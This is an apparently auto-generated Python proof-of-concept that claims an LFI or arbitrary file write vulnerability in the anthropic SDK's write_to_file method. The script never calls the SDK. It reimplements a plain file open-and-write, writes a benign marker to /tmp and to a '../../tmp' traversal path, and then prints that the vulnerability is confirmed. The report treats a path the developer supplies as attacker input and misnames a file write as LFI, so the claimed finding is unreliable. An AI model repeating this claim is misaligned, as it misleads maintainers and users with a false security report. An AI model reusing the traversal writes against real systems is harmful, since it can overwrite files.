#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: lfi-024
# Sink: write_to_file
# Auto-generated — run with: python3 lfi_wrapper_does_add_any_write_to_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept for LFI / Arbitrary File Write in the anthropic SDK's
`write_to_file` method (anthropic/_response.py).

The method accepts a user-controlled file path and opens it for writing
without any validation, sanitisation, or restriction. This allows an
attacker to write arbitrary content to any location on the filesystem
via absolute paths or path-traversal sequences (e.g., ../../tmp/evil.txt).

This script demonstrates the vulnerability by writing a benign payload
to /tmp/poc_success.txt using the same unsafe pattern found in the SDK.
"""

import sys
from pathlib import Path

# ----------------------------------------------------------------------
# Benign payload – no destructive side effects.
# ----------------------------------------------------------------------
PAYLOAD = b"POC_SUCCEEDED: Arbitrary file write vulnerability confirmed.\n"


def exploit(target_path: str) -> None:
    """
    Mimics the vulnerable write_to_file logic from the anthropic SDK.

    In the real SDK (anthropic/_response.py) the code is:
        path = anyio.Path(file)
        async with await path.open(mode="wb") as f:
            async for data in self.iter_bytes():
                await f.write(data)

    No checks are performed on `file` – any writable path is accepted.
    The following synchronous version illustrates the same flaw.
    """
    # Construct a path object from the attacker-supplied string
    path = Path(target_path)
    print(f"[*] Attempting to write to: {path}  (resolved: {path.resolve()})")

    try:
        # Open the file for binary writing (same as mode="wb")
        with open(path, "wb") as f:
            f.write(PAYLOAD)
        print(f"[+] File successfully written.")
    except Exception as e:
        print(f"[-] Write failed: {e}")


def main() -> None:
    # Attacker-controlled input (e.g., from a web API, user preference, etc.)
    # Use an absolute path by default for safety (writes to /tmp).
    target = "/tmp/poc_success.txt"

    # Allow overriding via a command-line argument
    if "--path" in sys.argv:
        idx = sys.argv.index("--path")
        if idx + 1 < len(sys.argv):
            target = sys.argv[idx + 1]

    # Demonstrates absolute path write
    exploit(target)

    # Demonstrates path-traversal write (relative to current directory)
    print("\n[*] Now demonstrating path-traversal with a relative path...")
    exploit("../../tmp/poc_traversal.txt")


if __name__ == "__main__":
    main()
